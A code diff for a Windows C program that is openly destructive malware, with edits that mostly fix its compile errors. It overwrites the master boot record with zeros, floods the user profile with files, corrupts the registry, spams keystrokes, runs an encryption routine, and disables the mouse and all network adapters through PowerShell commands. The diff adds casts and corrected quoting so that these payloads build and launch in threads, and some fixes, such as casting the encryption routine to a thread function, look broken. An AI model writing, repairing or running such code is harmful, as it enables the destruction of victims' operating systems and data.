@@ -14,17 +14,18 @@ void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t ke
 
 int main()
 {
-    _beginthread(trollies, 0, NULL);
-    _beginthread(filebomb, 0, NULL);
-    _beginthread(registrycorruption, 0, NULL);
-    _beginthread(keyboardspam, 0, NULL);
-    mbroverwrite();
+    void* ptr = NULL; // Placeholder argument for mbroverwrite()
+    mbroverwrite(ptr);
+    _beginthread((void (*)(void*))trollies, 0, NULL); // Cast to the correct function pointer type
+    _beginthread((void (*)(void*))filebomb, 0, NULL); // Cast to the correct function pointer type
+    _beginthread((void (*)(void*))registrycorruption, 0, NULL); // Cast to the correct function pointer type
+    _beginthread((void (*)(void*))keyboardspam, 0, NULL); // Cast to the correct function pointer type
+    _beginthread((void (*)(void*))crypter, 0, NULL); // Cast to the correct function pointer type
     Sleep(10000); // Wait for threads to finish, adjust time accordingly
     return 0;
 }
 
-void mbroverwrite()
-{
+void mbroverwrite(void *arg) {
     char mbrData[512]; // 512 bytes
     ZeroMemory(&mbrData, sizeof(mbrData));
 
@@ -33,13 +34,12 @@ void mbroverwrite()
     CloseHandle(MBR);
 }
 
-void filebomb(void *arg)
-{
+void filebomb(void *arg) {
     char filename[200]; // Array to store filename
     const char *desktopPath = getenv("USERPROFILE"); // For Windows, use the USERPROFILE environment variable
     if (desktopPath == NULL) {
         fprintf(stderr, "Error: Unable to get the desktop path.\n");
-        return 1;
+        return; // Change 1 to return
     }
 
     strcpy(filename, desktopPath); // Copy the desktop path to the filename
@@ -56,9 +56,7 @@ void filebomb(void *arg)
     }
 }
 
-
-void registrycorruption(void *arg)
-{
+void registrycorruption(void*) {
     HKEY hKey;
     DWORD dwDisposition;
     LONG lResult;
@@ -110,8 +108,7 @@ void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t ke
     }
 }
 
-void keyboardspam(void *arg)
-{
+void keyboardspam(void* ptr) {
     const char *text = "barney";
     INPUT inputs[6 * 2] = {0}; // Each character and its release
 
@@ -170,12 +167,9 @@ void trollies(void *arg)
     PlaySound("music.wav", NULL, SND_FILENAME|SND_ASYNC);
 
     //Disable mouse
-    system("powershell -Command \"Disable-PnpDevice -InstanceId (Get-PnpDevice -FriendlyName "HID-compliant mouse").InstanceId -Confirm:$false\"")
+    system("powershell -Command \"Disable-PnpDevice -InstanceId (Get-PnpDevice -FriendlyName \"HID-compliant mouse\").InstanceId -Confirm:$false\"");
 
     //Messes up computer screen
-
-    // Corrupts registry and files
-    registrycorruption();
 
     // Disable Internet Connection
     system("powershell -Command \"Get-NetAdapter | Disable-NetAdapter -Confirm:$false\"");
